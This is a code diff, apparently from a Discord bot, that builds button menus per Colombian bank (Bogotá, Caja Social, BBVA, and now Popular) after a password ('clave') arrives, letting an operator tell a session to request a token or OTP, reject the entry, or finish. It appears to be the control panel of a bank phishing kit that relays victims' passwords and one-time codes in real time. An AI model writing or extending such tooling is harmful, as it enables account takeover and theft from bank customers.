@@ -107,7 +107,7 @@ function buildEmbedOtp(banco, bancoKey, datos, sessionId, otpValor) {
 // ============================================
 // BOTONES DEL EMBED INICIAL (después de la clave)
 // - Bogotá: 2 botones (Token / Rechazar)
-// - Caja Social y BBVA: 3 botones (Rechazar / Token / OTP)
+// - Caja Social, BBVA, Popular: 3 botones (Rechazar / Token / OTP)
 // - Todos los demás: 2 botones (Rechazar / OTP)
 // ============================================
 function buildButtonsInicial(bancoKey, sessionId) {
@@ -124,7 +124,7 @@ function buildButtonsInicial(bancoKey, sessionId) {
         );
     }
 
-    if (bancoKey === 'caja-social' || bancoKey === 'bbva') {
+    if (bancoKey === 'caja-social' || bancoKey === 'bbva' || bancoKey === 'popular') {
         return new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
@@ -155,11 +155,11 @@ function buildButtonsInicial(bancoKey, sessionId) {
 
 // ============================================
 // BOTONES DEL EMBED TOKEN
-// - Caja Social y BBVA: 3 botones (Rechazar / OTP / Finalizar)
+// - Caja Social, BBVA, Popular: 3 botones (Rechazar / OTP / Finalizar)
 // - Otros: 3 botones (OTP / Finalizar / Rechazar)
 // ============================================
 function buildButtonsToken(bancoKey, sessionId) {
-    if (bancoKey === 'caja-social' || bancoKey === 'bbva') {
+    if (bancoKey === 'caja-social' || bancoKey === 'bbva' || bancoKey === 'popular') {
         return new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
@@ -194,11 +194,11 @@ function buildButtonsToken(bancoKey, sessionId) {
 
 // ============================================
 // BOTONES DEL EMBED OTP
-// - Caja Social y BBVA: 3 botones (Rechazar / Finalizar / Token)
+// - Caja Social, BBVA, Popular: 3 botones (Rechazar / Finalizar / Token)
 // - Otros: 2 botones (Rechazar / Finalizar)
 // ============================================
 function buildButtonsOtp(bancoKey, sessionId) {
-    if (bancoKey === 'caja-social' || bancoKey === 'bbva') {
+    if (bancoKey === 'caja-social' || bancoKey === 'bbva' || bancoKey === 'popular') {
         return new ActionRowBuilder().addComponents(
             new ButtonBuilder()
                 .setCustomId(`RECHAZAR|${bancoKey}|${sessionId}`)
